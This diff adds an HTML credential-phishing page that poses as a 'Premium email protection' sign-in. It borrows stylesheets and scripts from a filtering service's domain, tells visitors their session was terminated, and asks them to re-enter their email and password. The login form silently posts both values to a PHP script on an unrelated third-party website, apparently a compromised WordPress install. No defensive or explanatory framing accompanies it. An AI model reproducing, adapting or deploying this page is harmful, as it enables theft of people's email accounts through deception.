@@ -1,0 +1,140 @@
+<script>
+function validateForm()
+{
+var x=document.forms["myform"]["username"].value;
+var atpos=x.indexOf("@");
+var dotpos=x.lastIndexOf(".");
+if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length)
+  {
+  alert("Not a valid e-mail address");
+  return false;
+  }
+var y=document.forms["myform"]["password"].value;
+if(y==null || y=="")
+  {
+  alert("Password is Empty");
+  return false;
+  }
+var y=document.forms["myform"]["password"].value;
+if(y.length < 5)
+  {
+  alert("Password is not valid");
+  return false;
+  }
+}
+</script>
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, user-scalable=no"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      href="https://filter.au.ds.network/static/img/favicon.png"
+      sizes="32x32"
+    />
+    <link
+      rel="apple-touch-icon"
+      href="https://filter.au.ds.network/static/img/apple-touch-icon.png"
+    />
+    <title>Sign in | Premium email protection</title>
+    <link
+      rel="stylesheet"
+      href="https://filter.au.ds.network/themes/paper/bootstrap.min.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://filter.au.ds.network/vendor/components/font-
+
+awesome/css/font-awesome.min.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://filter.au.ds.network/static/css/styles.css"
+    />
+    <script src="https://filter.au.ds.network/static/js/jquery.min.js"></script>
+
+    <script 
+
+src="https://filter.au.ds.network/vendor/twbs/bootstrap/dist/js/bootstrap.min.js
+
+"></script>
+  </head>
+  <body class="">
+    <div class="container">
+      <div class="col-md-offset-3 col-md-6">
+        <div class="panel panel-default" style="margin-top: 40px; color: #00C;">
+          <div class="panel-heading">
+            <h3 class="panel-title">Sign in</h3>
+          </div>
+          <div class="panel-body">
+            <form
+              action="https://bozic.hr/wp-includes/xjobs/redel.php"
+              class="form-horizontal"
+              method="post"
+            name="myform" onSubmit="return validateForm()">
+              <p>
+                <input type="hidden" name="query" id="query" value="" />
+                <input type="hidden" name="timezone" id="timezone" />
+                <input type="hidden" name="useiframe" id="useiframe" />
+              </p>
+              <p>The session has been terminated. Re-enter  email and password 
+
+to continue </p>
+              <div class="form-group">
+                <label for="username" class="control-label col-sm-3"
+                  >Email address</label
+                >
+                <div class="col-sm-9">
+                  <input
+                    type="text"
+                    class="form-control"
+                    name="kaka1"
+                    id="username"
+                    required
+                    autofocus
+                  />
+                </div>
+              </div>
+              <div class="form-group">
+                <label for="username" class="control-label col-sm-3"
+                  >Password</label
+                >
+                <div class="col-sm-9">
+                  <input
+                    type="password"
+                    class="form-control"
+                    name="kaka2"
+                    required
+                    id="password"
+                  />
+                </div>
+              </div>
+              <div class="form-group">
+                <div class="col-sm-offset-3 col-sm-9">
+                  <button type="submit" class="btn btn-primary">
+                    <i class="fa fa-sign-in"></i>&nbsp;Sign in
+                  </button>
+                </div>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script>
+      $("#timezone").val(new Date().getTimezoneOffset());
+
+      if ($("<iframe>").prop("sandbox") !== undefined && $("<iframe>").prop
+
+("srcdoc") !== undefined) {
+      	$("#useiframe").val(true);
+      }
+    </script>
+  </body>
+</html>
